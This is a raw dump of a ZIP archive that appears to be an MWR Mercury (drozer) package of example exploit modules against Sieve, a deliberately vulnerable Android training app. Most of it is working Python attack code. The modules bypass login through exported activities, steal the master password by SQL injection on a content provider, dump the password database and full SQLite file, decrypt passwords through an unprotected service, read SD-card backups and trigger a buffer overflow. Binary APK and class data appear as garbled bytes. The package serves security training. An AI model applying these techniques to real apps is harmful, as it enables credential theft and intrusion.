PK     tMEB�<*�  �     ServiceBinder.apkPK  tMEB              META-INF/MANIFEST.MF��  �M��LK-.�K-*��ϳR0�3��rI����ON,%�$�륤V�r9�&����:UZ)�T ���r�r PK���F   H   PK  tMEB               classes.dex}�mlG����w�{���vql�����gHBҞ1��;��\��WD��֗�/{׻�kCE�(��H/	�
�@�HHT!���PU*�/��JHP	ċZT�f�sl��o�g�yfvf�gfw+�ft��I�OO,l�����O�w_}��=��=��d<	4l^:�����y������4 &�(�eJ�p��#��0�7�.y��zؖ��Ar��%��r�|��F�"�!��k�,�ˤ�������$��)�$�Fn�o���ߐ7�[��������}"'"	2B��r�̑e�8��+�%�N�'�$?$?!�$�����]r�$��ar�̓%�)��J�TN����*p�����X��������"�$M�+�1r�L�I�0 D���G�9����Zk�����	�,yݧ��sT��ԏh]>�~����u�/u�?��ܥ���_�������k�?���6�j�Oa��I�B�4>���d �TNฒC8��9%{�1]�S���Z�$R�{ ���G��ⴒ<���]H��)%�J�a��Y�ra ǔ��*~;��gU�$U9�l�%C8�����`��T�ĕ_R�Hً3*�~�R~T�0�UYʞ����k��M�Ôy��:I��u?�%�+2>�^��=��q��/Z��s4U}=��p1@3��z�P��Y����hɬK�4��-���l-���^�i!#�ZU6�Ȟ��y�����+� ��+��Zr/��b��(�������������Ps�r�ߏ��9��uo�&܌l�Թ$��V���{�;�I*_�����W\�b&Ji��!dT�'��'B�G����Ÿn�д�i)Z!�C��7+�>b**&��6��m�R�0�	d�oFќa�����Ѹ��{ܘh2�ʥb9Bo�^|1R�j�A#������8g�f<3
%��Q�D�t�Dq�P(1dfug`18nJ��x�J!�6�p��tHETο�t
ĵR���&����7C�E�j��~f��ς��*�A��X����۸���K��]�~{�ޣ���&p���M�^0����P����S�	(�J�'��]�2޵Ǥ������%T?!�����ܚ7c.����E��Q+;��u�^��B,C������q_^;,�܊�:�O�zw;�p(o��V�Vɖ��^v�q��p�=j_sr8��妗CzOղ9��ޚ}�ҿ��hg��J���6.���Q��c-\i9v�˝y��<�h4�q���ݶ�|�нVǭJ�|Ůo�ֲ��6<[:{�-��[]���v���,s�-]x��ε�vp�2����Zյ��G7��jo�ٺ�V��6�N�_��.�r��T�����Ѻ�>�.�L�'��j�7=������d�*��v�kq�9�v�Z�j�	�^{�YuZ�[v8��S�C��*���t��ڕ�Ӳ-�%�Γ<�����[b�J�� �,��r��z�nWۈ�؉�ag�)�{U�C����g#B��D���#qE��S4j.�z���e�#�V���u�%�fu���Nf�����Z��c��f}��@O�isS��u��DC��0Ԯ���K;j�`ұ����i����6uu�v����`۳[BޕZ���n��7����Y���y��S�gs���ė�`���1>��Y��:n(�븥d��Q~ޅ��LMe��gqB��c_��o���c�������s��y�kF{l|%�CUތ^����i�)�4j��T�FK"m���6�N�J7�`nG�x�܎
��B"���8C7:���XH��[I!^N�����ޑ�$y&w���t��L��_�������7,��z�d�w�6�P����\���w���+���_~G��y����V������PK\��^    PK   tMEB���F   H                   META-INF/MANIFEST.MF��  PK   tMEB\��^                 �   classes.dexPK         #    PK     qMEBt��0   0      .mercury_packageExample exploit modules, for the MWR Sieve App.
PK     qMEBB����  �  
   service.pyimport binascii
import os
import re

from mwr.cinnibar.reflection import ReflectionException

from mwr.droidhg import android
from mwr.droidhg.modules import common, Module

class ServiceExploitBase(Module, common.Filters, common.PackageManager, common.ClassLoader):
    
    def _find_package(self, name, arguments):
        if arguments.verbose:
            self.stdout.write("[color blue]mercury> run app.package.list[/color]\n")
            
        for package in self.packageManager().getPackages(common.PackageManager.GET_SERVICES):
            if package.packageName == name:
                if arguments.verbose:
                    self.stdout.write("  [color green]%s[/color]\n\n" % package.packageName)
                
                return package
            else:
                if arguments.verbose:
                    self.stdout.write("  %s\n" % package.packageName)
                    
    def _find_service(self, package, name, arguments):
        if arguments.verbose:
            self.stdout.write("[color blue]mercury> run app.service.info -a %s[/color]\n" % package.packageName)
            
        for exported_service in self.match_filter(package.services, 'exported', True):
            if exported_service.name == name:
                if arguments.verbose:
                    self.stdout.write("  [color green]%s[/color]\n\n" % exported_service.name)
                    
                return exported_service
            else:
                if arguments.verbose:
                    self.stdout.write("  %s\n" % exported_service.name)


class Decrypt(ServiceExploitBase):
    
    appName = "com.mwr.example.sieve"
    serviceName = "com.mwr.example.sieve.CryptoService"

    name = "Decrypt a password, using Sieve's CryptoService"
    description = """Sieve is a vulnerable Android application, released by MWR InfoSecurity for training purposes.

Sieve includes a number of common Android vulnerabilities, including private Services that are exported with no permissions required to interact with them.

This module exploits one example vulnerability, to launch use Sieve's CryptoService to decrypt a password."""
    examples = """Decrypt a given ciphertext with a key:

    mercury> example.sieve.service.decrypt [-h, -v] <key> <string>
        
    mercury>example.sieve.binding.encrypt "orangesandlemons" 9lCo9kXmzJ2Yo5p7CtFX4DC9ZxQ73VQoJf61Mw==
    string: <cleartext>
    """
    author = "MWR InfoSecurity (@mwrlabs)"
    date = "2013-01-17"
    license = "MWR Code License"
    path =["example", "sieve", "service"]

    def add_arguments(self, parser):
        parser.add_argument("key", help="a 16 character key")
        parser.add_argument("ciphertext", help="the ciphertext string to be decrypted")
        parser.add_argument("-v", "--verbose", action="store_true", default=False, help="be verbose, show how to identify and exploit this vulnerability")

    def execute(self, arguments):
        if arguments.verbose:
            self.stdout.write("[color purple]Searching for packages....[/color]\n")
            
        package = self._find_package(self.appName, arguments)
        
        if package != None:
            if arguments.verbose:
                self.stdout.write("[color purple]Found %s. Searching for exported services...[/color]\n" % package.packageName)
            
            service = self._find_service(package, self.serviceName, arguments)
            
            if service != None:
                if arguments.verbose:
                    self.stdout.write("[color purple]Found %s. Building a Message...[/color]\n" % service.name)
                
                Message = self.klass("android.os.Message")

                bundle = self.new("android.os.Bundle")
                bundle.putString("com.example.relebadmemory.KEY", arguments.key)
                bundle.putByteArray("com.example.relebadmemory.PASSWORD", self.arg(binascii.a2b_base64(arguments.ciphertext), obj_type="data"))

                msg = Message.obtain(None, 13476, bundle)
                
                if arguments.verbose:
                    self.stdout.write("[color purple]Creating a Service Binding...[/color]\n")
                
                ServiceBinder = self.loadClass("ServiceBinder.apk", "ServiceBinder", relative_to=__file__)
                binder = self.new(ServiceBinder)
                
                if binder.execute(self.getContext(), self.appName, self.serviceName, msg):
                    self.stdout.write("%s\n" % binder.getData().getString("com.example.relebadmemory.RESULT"))
                else:
                    self.stderr.write("Error: operation failed\n")
            else:
                self.stderr.write("Error: could not find CryptoService.\n")
        else:
            self.stderr.write("Error: could not find %s. Is Sieve installed?\n" % self.appName)
            

class Encrypt(ServiceExploitBase):
    
    appName = "com.mwr.example.sieve"
    serviceName = "com.mwr.example.sieve.CryptoService"

    name = "Encrypt a password, using Sieve's CryptoService"
    description = """Sieve is a vulnerable Android application, released by MWR InfoSecurity for training purposes.

Sieve includes a number of common Android vulnerabilities, including private Services that are exported with no permissions required to interact with them.

This module exploits one example vulnerability, to launch use Sieve's CryptoService to encrypt a password."""
    examples = """Encrypt a given plaintext with a key:

    mercury> example.sieve.service.encrypt [-h, -v] <key> <string>
        
    mercury>example.sieve.binding.encrypt "orangesandlemons" "My Plain Text"
    string: <ciphertext>
    """
    author = "MWR InfoSecurity (@mwrlabs)"
    date = "2013-01-17"
    license = "MWR Code License"
    path =["example", "sieve", "service"]

    def add_arguments(self, parser):
        parser.add_argument("key", help="a 16 character key")
        parser.add_argument("plaintext", help="the plaintext string to be encrypted")
        parser.add_argument("-v", "--verbose", action="store_true", default=False, help="be verbose, show how to identify and exploit this vulnerability")

    def execute(self, arguments):
        if arguments.verbose:
            self.stdout.write("[color purple]Searching for packages....[/color]\n")
            
        package = self._find_package(self.appName, arguments)
        
        if package != None:
            if arguments.verbose:
                self.stdout.write("[color purple]Found %s. Searching for exported services...[/color]\n" % package.packageName)
            
            service = self._find_service(package, self.serviceName, arguments)
            
            if service != None:
                if arguments.verbose:
                    self.stdout.write("[color purple]Found %s. Building a Message...[/color]\n" % service.name)
                
                Message = self.klass("android.os.Message")

                bundle = self.new("android.os.Bundle")
                bundle.putString("com.example.relebadmemory.KEY", arguments.key)
                bundle.putString("com.example.relebadmemory.STRING", arguments.plaintext)
        
                msg = Message.obtain(None, 3452, bundle)
                
                if arguments.verbose:
                    self.stdout.write("[color purple]Creating a Service Binding...[/color]\n")
                
                ServiceBinder = self.loadClass("ServiceBinder.apk","ServiceBinder", relative_to=__file__)
                binder = self.new(ServiceBinder)
                
                if binder.execute(self.getContext(), self.appName, self.serviceName, msg):
                    self.stdout.write("%s (Base64-encoded)\n" % binder.getData().getByteArray("com.example.relebadmemory.RESULT").base64_encode())
                else:
                    self.stderr.write("Error: operation failed\n")
            else:
                self.stderr.write("Error: could not find CryptoService.\n")
        else:
            self.stderr.write("Error: could not find %s. Is Sieve installed?\n" % self.appName)
            PK     qMEBf�c�	  	  	   sdcard.pyimport os
from xml.etree import ElementTree

from mwr.droidhg.modules import common, Module

class Extract(Module, common.ClassLoader, common.FileSystem):

    sdDirectory = "/mnt/sdcard/Android/data/com.mwr.example.sieve/files"

    name = "extract Sieve passwords from SD Card backups"
    description = "extract Sieve passwords from SD Card backups"
    examples = ""
    author = "MWR InfoSecurity (@mwrlabs)"
    date = "2012-11-06"
    license = "MWR Code License"
    path = ["example", "sieve", "sdcard"]

    def add_arguments(self, parser):
        parser.add_argument("-v", "--verbose", action="store_true", default=False, help="be verbose, show how to identify and exploit this vulnerability")

    def execute(self, arguments):
        if arguments.verbose:
            self.stdout.write("[color purple]List all backup files...[/color]\n")
            self.stdout.write("[color blue]mercury>run shell.exec \"ls /mnt/sdcard/Android/data/com.mwr.example.sieve/files\"[/color]\n")
            self.stdout.write("%s\n" % "\n".join(map(lambda f: "  %s" % f, self.listFiles(self.sdDirectory))))
            
        backups = self.listFiles(self.sdDirectory)
        if backups == None:
            return
        for backup in backups:
            if arguments.verbose:
                self.stdout.write("[color blue]mercury>run tools.file.download \"%s\" \"%s\"[/color]\n" % ("/".join([self.sdDirectory, str(backup)]), os.path.sep.join(["path", "to", "target", str(backup)])))
            
            self._process_file(backup)
            
    def _process_file(self, backup):
        data = self.readFile("%s/%s"%(self.sdDirectory, backup))
        xml = ElementTree.fromstring(data)
        
        
        self.stdout.write("%s:\n" % backup)
        self.stdout.write("  password: %s\n" % xml.attrib['Key'])
        self.stdout.write("       pin: %s\n" % xml.attrib['Pin'])
        
        for entry in xml.findall('entry'):
            self.stdout.write("            %s\n" % entry.find('service').text)
            self.stdout.write("              username: %s\n" % entry.find('username').text)
            self.stdout.write("                 email: %s\n" % entry.find('email').text)
            self.stdout.write("              password: %s\n" % entry.find('password').text)
        self.stdout.write("\n")
        PK     qMEB���!�!  �!     provider.pyimport os

from mwr.cinnibar.reflection import ReflectionException

from mwr.common import fs

from mwr.droidhg import android
from mwr.droidhg.modules import common, Module

class ContentProviderExploitBase(Module, common.TableFormatter, common.Filters, common.PackageManager, common.Provider, common.FileSystem, common.Strings, common.ZipFile, common.ClassLoader):

    def _get_content_provider(self, arguments):
        if arguments.verbose:
            self.stdout.write("[color purple]Searching for accessible ContentProvider URIs...[/color]\n")
            self.stdout.write("[color blue]mercury> run scanner.provider.finduris %s[/color]\n"%self.appName)
            
        for uri in self.findAllContentUris(self.appName):
            if uri == self.contentProvider:
                if arguments.verbose:
                    self.stdout.write("  [color green]%s[/color]\n"%uri)
                    
                return uri
            else:
                if arguments.verbose:
                    self.stdout.write("  %s\n"%uri)
                    
        self.stderr.write("Error: Unable to find expected Uri in %s.\n"% self.appName)
        
class GetKey(ContentProviderExploitBase):
    
    appName = "com.mwr.example.sieve"
    contentProvider = "content://com.mwr.example.sieve.DBContentProvider/Passwords"
    
    name = "steal the master password from Sieve, using SQL Injection"
    description = """Sieve is a vulnerable Android application, released by MWR InfoSecurity for training purposes.

Sieve includes a number of common Android vulnerabilities, including SQL Injection vulnerabilities in content providers.

This module exploits one example vulnerability, to steal the master password through SQL Injection.""" 
    examples = ""
    author = "MWR InfoSecurity (@mwrlabs)"
    date = "2013-01-16"
    license = "MWR Code License"
    path = ["example", "sieve", "provider"]

    def add_arguments(self, parser):
        parser.add_argument("-v", "--verbose", action="store_true", default=False, help="be verbose, show how to identify and exploit this vulnerability")

    def execute(self, arguments):
        targetProvider = self._get_content_provider(arguments)
        
        try:
            if arguments.verbose:
                self.stdout.write("\n[color purple]Executing SQL Injection against the content provider...[/color]\n")
                self.stdout.write("[color blue]mercury> run app.provider.query %s --projection \"* from Key;--\"[/color]\n" % targetProvider)
                
            result = self.contentResolver().query(targetProvider, projection=["* from Key;--"])
            rows = self.getResultSet(result)
            
            self.print_table(rows, show_headers=True, vertical=True)
        except ReflectionException as e:
            self.stderr.write("Error: Unable to query Content Provider %s\n" % targetProvider)
            

class GetPasswords(ContentProviderExploitBase):

    appName = "com.mwr.example.sieve"
    contentProvider = "content://com.mwr.example.sieve.DBContentProvider/Passwords"

    name = "steal the password database from Sieve, using a leaky content provider"
    description = """Sieve is a vulnerable Android application, released by MWR InfoSecurity for training purposes.

Sieve includes a number of common Android vulnerabilities, including content providers exported with no permission required.

This module exploits one example vulnerability, to steal the encrypted passwords.""" 
    examples = ""
    author = "MWR InfoSecurity (@mwrlabs)"
    date = "2013-01-16"
    license = "MWR Code License"
    path =["example","sieve","provider"]

    def add_arguments(self, parser):
        parser.add_argument("-v", "--verbose", action="store_true", default=False, help="be verbose, show how to identify and exploit this vulnerability")
        parser.add_argument("-d", "--decrypt", help="provide a key to decrypt the passwords", metavar="key")
    
    def execute(self, arguments):
        targetProvider = self._get_content_provider(arguments)
        
        try:
            if arguments.verbose:
                self.stdout.write("\n[color purple]Reading passwords from the content provider...[/color]\n")
                self.stdout.write("[color blue]mercury>run app.provider.query %s[/color]\n" % targetProvider)
                
            result = self.contentResolver().query(targetProvider)
            rows = self.getResultSet(result)

            if arguments.decrypt != None:
                rows = self._decrypt_rows(result, rows, arguments)

            if rows != None:
                self.print_table(rows, show_headers=True, vertical=True)
            else:
                self.stderr.write("Error: unable to get rows")
        except ReflectionException as e:
            self.stderr.write("Error: Unable to query provider %s\n"%targetProvider)
            return

    def _decrypt_rows(self, result, rows, arguments):
        ServiceBinder = self.loadClass("ServiceBinder.apk","ServiceBinder", relative_to=__file__)
        Message = self.klass("android.os.Message")
        binder = self.new(ServiceBinder)
        
        if result != None:
            if arguments.verbose:
                self.stdout.write("\n[color purple]Decrypting Passwords...[/color]\n")
                self.stdout.write("[color blue]mercury> example.sieve.service.decrypt <key> <plaintext>[/color]\n")

            i = 1
            
            result.moveToFirst()
            while result.isAfterLast() == False:
                bundle = self.new("android.os.Bundle")
                bundle.putString("com.example.relebadmemory.KEY", arguments.decrypt)
                bundle.putByteArray("com.example.relebadmemory.PASSWORD", result.getBlob(result.getColumnIndex("password")))

                msg = Message.obtain(None, 13476, bundle)
                
                if binder.execute(self.getContext(), "com.mwr.example.sieve", "com.mwr.example.sieve.CryptoService", msg):
                    rows[i][3] = binder.getData().getString("com.example.relebadmemory.RESULT")
                else:
                    return None

                i+=1
                
                result.moveToNext()
                
        return rows

class GetDatabase(ContentProviderExploitBase):

    appName = "com.mwr.example.sieve"
    contentProvider = "content://com.mwr.example.sieve.FileBackupProvider"
    targetFile = "/data/data/%s/databases/database.db"%appName

    name = "steal the entire SQLite database from Sieve, using a leaky content provider"
    description = """Sieve is a vulnerable Android application, released by MWR InfoSecurity for training purposes.

Sieve includes a number of common Android vulnerabilities, including content providers exported with no permission required.

This module exploits one example vulnerability, to steal the entire SQLite database file.""" 
    examples = ""
    author = "MWR InfoSecurity (@mwrlabs)"
    date = "2013-01-17"
    license = "MWR Code License"
    path =["example","sieve","provider"]

    def add_arguments(self, parser):
        parser.add_argument("-v", "--verbose", action="store_true", default=False, help="be verbose, show how to identify and exploit this vulnerability")
        parser.add_argument("-f", "--file", default=None, help="output file")

    def execute(self, arguments):
        targetProvider = self._get_content_provider(arguments) + self.targetFile
        
        try:
            data = self.contentResolver().read(targetProvider)
            
            if arguments.file is None:
                if arguments.verbose:
                    self.stdout.write("\n[color purple]Attempting to read from the Content Provider...[/color]")
                    self.stdout.write("\n[color blue]mercury> run app.provider.read %s[/color]\n" % targetProvider)
                self.stdout.write(data + "\n")
            else:
                if arguments.verbose:
                    self.stdout.write("\n[color purple]Attempting to download from the Content Provider...[/color]")
                    self.stdout.write("\n[color blue]mercury> run app.provider.download %s %s[/color]\n" % (targetProvider, arguments.file))
                
                if os.path.isdir(arguments.file):
                    arguments.file = os.path.sep.join([arguments.file, targetProvider.split("/")[-1]])
            
                data_len = fs.write(arguments.file, data)
                
                self.stdout.write("Written %d bytes.\n" % data_len)
        except ReflectionException as e:
            self.stderr.write("Error: Unable to query provider %s\n" % targetProvider)
            PK     qMEB���%  %     ServiceBinder.javaimport java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.IOException;
import java.io.InputStream;
import android.os.Message;
import android.os.Messenger;
import android.content.Intent;
import android.content.ServiceConnection;
import android.app.Activity;
import android.content.Context;
import android.content.ComponentName;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Process;
import android.util.Log;
import java.lang.ref.WeakReference;

/* Mercury ServiceBinder
 * 
 * The ServiceBinder provides synchronous interaction with services, exported by
 * other Android apps.
 * 
 * To use the ServiceBinder, create an instance and call execute(). This will
 * bind to the service and send the message, before waiting for the result.
 * 
 * If a response was received, #execute() returns True; otherwise False. The
 * ServiceBinder will wait for twenty seconds before a timeout.
 * 
 * If #execute() returned True, you can access the response Message through
 * #getMessage(), and its attached Bundle through #getData().
 */
public class ServiceBinder {

    Message in;

    //this is used to recieve a response from the handler
    volatile Message response = null;
    private Message returnMessage = null;
    private Bundle returnBundle = null;

    //lock object to wait fro a response from the service
    public volatile Object lock = new Object();
    
    //connection handler
    HgServiceConnection serviceConnection;

    public boolean execute(Context context, String package_name, String class_name, Message message) {
        HandlerThread thread = new HandlerThread("MercuryHandler", Process.THREAD_PRIORITY_BACKGROUND);
        thread.start();
        Looper serviceLooper = thread.getLooper();

        serviceConnection = new HgServiceConnection(serviceLooper, this);

        ComponentName c = new ComponentName(package_name, class_name);

        in = message;
        
        if(c == null)
            return false;

        Intent i = new Intent();
        i.setComponent(c);
        
        // bind to the service, and wait for the send/receive to finish
        synchronized(lock){
            context.bindService(i, serviceConnection, Context.BIND_AUTO_CREATE);
            
            try {
                lock.wait(20000);
            }
            catch(InterruptedException e){
                return false;
            }
        }
        
        // unbind from the service, so we don't leak handles
        context.unbindService(serviceConnection);
        
        // if a response was received, store it in our local variables
        if(response != null) {
            this.returnMessage = Message.obtain(this.response);
            this.returnBundle = this.returnMessage.getData();
            
            return true;
        }
        else {
            return false;
        }
    }

    // when message is reutnred to the python, the bundle is not returned with it.
    // this method allows you to do so
    public Bundle getData(){
        return this.returnBundle;
    }
    
    // return the message to client side
    public Message getMessage(){
        return this.returnMessage;
    }

    private class HgServiceConnection extends Handler implements ServiceConnection {

        Messenger serviceMessenger = null;
        Messenger responseMessenger = new Messenger(this);

        private WeakReference<ServiceBinder> sb;
    
        public HgServiceConnection(Looper looper, ServiceBinder sb){
            super(looper);
            
            this.sb = new WeakReference<ServiceBinder>(sb);
        }

        public void onServiceConnected(ComponentName className, IBinder service) {
	        //service has been connected to this, send the given message
	        serviceMessenger = new Messenger(service);
	        sendToService(this.sb.get().in);
	    }
	    
	    public void onServiceDisconnected(ComponentName className) {
	        //error during connection / something went wrong during binding.
            //notify lock, since we have not set response to something, the main thread
            //will recognize that something has gone wrong
            this.sb.get().lock.notifyAll();
	    }

        @Override
        public void handleMessage(Message msg){
            this.sb.get().response = Message.obtain(msg);
            
            synchronized(this.sb.get().lock){
                try {
                    this.sb.get().lock.notifyAll();
                }
                catch(IllegalMonitorStateException e){}
            }
        }

        public void sendToService(Message msg){
            msg.replyTo = responseMessenger;
            try {
                serviceMessenger.send(msg);
            }
            catch(Exception e){}
        }
    
    }

}
PK     qMEB6~2A�  �     activity.pyimport os

from mwr.cinnibar.reflection import ReflectionException

from mwr.droidhg import android
from mwr.droidhg.modules import common, Module

class ActivityExploitBase(Module, common.Filters, common.PackageManager):
    
    def _find_activity(self, package, name, arguments):
        if arguments.verbose:
            self.stdout.write("[color blue]mercury> run app.activity.info -a %s[/color]\n" % package.packageName)
            
        for exported_activity in self.match_filter(package.activities, 'exported', True):
            if exported_activity.name == name:
                if arguments.verbose:
                    self.stdout.write("  [color green]%s[/color]\n\n" % exported_activity.name)
                    
                return exported_activity
            else:
                if arguments.verbose:
                    self.stdout.write("  %s\n" % exported_activity.name)
                    
    def _find_package(self, name, arguments):
        if arguments.verbose:
            self.stdout.write("[color blue]mercury> run app.package.list[/color]\n")
            
        for package in self.packageManager().getPackages(common.PackageManager.GET_ACTIVITIES):
            if package.packageName == name:
                if arguments.verbose:
                    self.stdout.write("  [color green]%s[/color]\n\n" % package.packageName)
                
                return package
            else:
                if arguments.verbose:
                    self.stdout.write("  %s\n" % package.packageName)
    
    def _launch_activity(self, package, activity, arguments):
        if arguments.verbose:
            self.stdout.write("[color blue]mercury> run app.activity.start --component %s %s --flags ACTIVTY_NEW_TASK[/color]\n" % (package.packageName, activity.name))
        
        intent = android.Intent(component=[package.packageName, activity.name], flags=["ACTIVITY_NEW_TASK"])
        self.getContext().startActivity(intent.buildIn(self))
        

class OpenPwList(ActivityExploitBase):
    
    appName = "com.mwr.example.sieve"
    activityName = "com.mwr.example.sieve.PWList"

    name = "Open the PWList Activity in Sieve"
    description = """Sieve is a vulnerable Android application, released by MWR InfoSecurity for training purposes.

Sieve includes a number of common Android vulnerabilities, including private Activities that are exported with no permissions required to launch them.

This module exploits one example vulnerability, to launch Sieve's password list activity, bypassing the normal log-in sequence.  
    """
    examples = """Start the PWList Activity in Sieve
    
    mercury> example.sieve.activity.openpwlist

Run any example.sieve.* module with the -v option to see how to find and exploit similar vulnerabilities.
    """
    author = "MWR InfoSecurity (@mwrlabs)"
    date = "2013-01-16"
    license = "MWR Code License"
    path = ["example", "sieve", "activity"]

    def add_arguments(self, parser):
        parser.add_argument("-v", "--verbose", action="store_true", default=False, help="be verbose, show how to identify and exploit this vulnerability")

    def execute(self, arguments):
        if arguments.verbose:
            self.stdout.write("[color purple]Searching for packages....[/color]\n")
            
        package = self._find_package(self.appName, arguments)
        
        if package != None:
            if arguments.verbose:
                self.stdout.write("[color purple]Found %s. Searching for exported activities...[/color]\n" % package.packageName)
            
            activity = self._find_activity(package, self.activityName, arguments)
            
            if activity != None:
                if arguments.verbose:
                    self.stdout.write("[color purple]Found %s. Launching the Activity...[/color]\n" % activity.name)
                    
                self._launch_activity(package, activity, arguments)
            else:
                self.stderr.write("Error: could not find PWList Activity.\n")
        else:
            self.stderr.write("Error: could not find %s. Is Sieve installed?\n" % self.appName)
        

class OpenFileSelect(ActivityExploitBase):
    
    appName = "com.mwr.example.sieve"
    activityName = "com.mwr.example.sieve.FileSelectActivity"

    name = "Open the FileSelect Activity in Sieve"
    description = """Sieve is a vulnerable Android application, released by MWR InfoSecurity for training purposes.

Sieve includes a number of common Android vulnerabilities, including private Activities that are exported with no permissions required to launch them.

This module exploits one example vulnerability, to launch Sieve's file system browser dialog.  
    """
    examples = """Start the FileSelect Activity in Sieve
        
    mercury> example.sieve.activity.openfileselect

Run any example.sieve.* module with the -v option to see how to find and exploit similar vulnerabilities.
    """
    author = "MWR InfoSecurity (@mwrlabs)"
    date = "2013-01-16"
    license = "MWR Code License"
    path =["example", "sieve", "activity"]

    def add_arguments(self, parser):
        parser.add_argument("-v", "--verbose", action="store_true", default=False, help="be verbose, show how to identify and exploit this vulnerability")

    def execute(self, arguments):
        if arguments.verbose:
            self.stdout.write("[color purple]Searching for packages....[/color]\n")
            
        package = self._find_package(self.appName, arguments)
        
        if package != None:
            if arguments.verbose:
                self.stdout.write("[color purple]Found %s. Searching for exported activities...[/color]\n" % package.packageName)
            
            activity = self._find_activity(package, self.activityName, arguments)
            
            if activity != None:
                if arguments.verbose:
                    self.stdout.write("[color purple]Found %s. Launching the Activity...[/color]\n" % activity.name)
                    
                self._launch_activity(package, activity, arguments)
            else:
                self.stderr.write("Error: could not find FileSelect Activity.\n")
        else:
            self.stderr.write("Error: could not find %s. Is Sieve installed?\n" % self.appName)
            PK     tMEB��ޟ  �  '   ServiceBinder$HgServiceConnection.class����   2 h	  7
  8	  9 :
  ;	  < =
  >	  ?
  @
  A B	  C
  D	  E
 F G
 H I	  J K	 H L
  M N O R S serviceMessenger Landroid/os/Messenger; responseMessenger sb Ljava/lang/ref/WeakReference; 	Signature .Ljava/lang/ref/WeakReference<LServiceBinder;>; this$0 LServiceBinder; <init> 4(LServiceBinder;Landroid/os/Looper;LServiceBinder;)V Code LineNumberTable onServiceConnected 6(Landroid/content/ComponentName;Landroid/os/IBinder;)V onServiceDisconnected "(Landroid/content/ComponentName;)V handleMessage (Landroid/os/Message;)V StackMapTable O T U K V sendToService N 
SourceFile ServiceBinder.java ! " # W   android/os/Messenger # X   java/lang/ref/WeakReference # Y   # Z [ \ ServiceBinder ] ^ 3 , _ ` U a b T c d e ^ &java/lang/IllegalMonitorStateException f  g , java/lang/Exception !ServiceBinder$HgServiceConnection HgServiceConnection InnerClasses android/os/Handler !android/content/ServiceConnection android/os/Message java/lang/Object java/lang/Throwable (Landroid/os/Looper;)V (Landroid/os/Handler;)V (Ljava/lang/Object;)V (Landroid/os/IBinder;)V get ()Ljava/lang/Object; in Landroid/os/Message; lock Ljava/lang/Object; 	notifyAll ()V obtain *(Landroid/os/Message;)Landroid/os/Message; response replyTo send                              ! "     # $  %   T     (*+� *,� *� *� Y*� � *� Y-� � 	�    &       q  r 
 l  m  t ' u  ' (  %   >     *� Y,� 
� **� 	� � � � �    &       y  z  {  ) *  %   -     *� 	� � � � �    &   
    �  �  + ,  %   �     B*� 	� � +� � *� 	� � � YM�*� 	� � � � � N,ç 
:,���  ! 1 4  ! 7 :   : > :    &       �  � ! � 1 � 5 � A � -    � 4  . / 0  1 D 2�   3 ,  %   N     +*� � *� +� � M�       &       �  �  �  � -    S 4   5    6 Q   
    P PK     qMEB?���    	   native.pyimport os
import re

from mwr.cinnibar.reflection import ReflectionException, types

from mwr.droidhg import android
from mwr.droidhg.modules import common, Module

class BufferOverflow(Module, common.Filters, common.PackageManager, common.ClassLoader):
    
    appName = "com.mwr.example.sieve"
    serviceName = "CryptoService"
    attackString = None
    baseString = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        
    matchPattern = re.compile("Fatal")
    command = ["sh", "-c","logcat | grep -v Unexpected | grep -v DEBUG"]

    name = "trigger a stack-based buffer overflow in Sieve's CryptoService"
    description = """Sieve is a vulnerable Android application, released by MWR InfoSecurity for training purposes.

Sieve includes a number of common Android vulnerabilities, including poorly designed memory management in native code. 

This module exploits one example vulnerability, to triffer a buffer overflow condition in Sieve's CryptoService.

Note: this module is highly likely to crash the Mercury Agent.  
    """
    examples = ""
    author = "MWR InfoSecurity (@mwrlabs)"
    date = "2013-01-17"
    license = "MWR Code License"
    path =["example", "sieve", "native"]

    def add_arguments(self, parser):
        parser.add_argument("-v", "--verbose", action="store_true", default=False, help="print process")
        parser.add_argument("exploit", nargs="?", default=None, help="specify the exploit payload")

    def execute(self, arguments):
        if arguments.exploit == None:
            self.attackString = "%s%s" % (self.baseString, "\x01\x02\x03\x04")
        else:
            self.attackString = "%s%s" % (self.baseString, arguments.exploit)
            
        if arguments.verbose:
            self.stdout.write("[color blue]Setting Key for use in encryption to: %s[/color]\n" % self.attackString)
            self.stdout.write("[color blue]Setting Up Binder[/color]\n")
            
        ServiceBinder = self.loadClass("ServiceBinder.apk", "ServiceBinder", relative_to=__file__)
        
        Message = self.klass("android.os.Message")
        binder = self.new(ServiceBinder)

        if arguments.verbose:
            self.stdout.write("[color blue]Creating bundle for message, adding Key and dummy String (\"somedatagoeshere\")[/color]\n")
        
        bundle = self.new("android.os.Bundle")
        bundle.putString("com.example.relebadmemory.KEY", self.attackString)
        bundle.putByteArray("com.example.relebadmemory.PASSWORD", types.ReflectedBinary("somedatagoeshere"))

        msg = Message.obtain(None, 13476, bundle)

        binder.execute(self.getContext(), "com.mwr.example.sieve", "com.mwr.example.sieve.CryptoService", msg)
        
        self.stdout.write("Executed Attack.\n")
        PK     qMEB               __init__.pyPK     tMEB�<*�  �             ��    ServiceBinder.apkPK     qMEBt��0   0              ���  .mercury_packagePK     qMEBB����  �  
           ��E	  service.pyPK     qMEBf�c�	  	  	           ��F)  sdcard.pyPK     qMEB���!�!  �!             ���2  provider.pyPK     qMEB���%  %             ���T  ServiceBinder.javaPK     qMEB6~2A�  �             ���g  activity.pyPK     tMEB��ޟ  �  '           ���  ServiceBinder$HgServiceConnection.classPK     qMEB?���    	           ��ʈ  native.pyPK     qMEB                       ���  __init__.pyPK    
 
 c  �    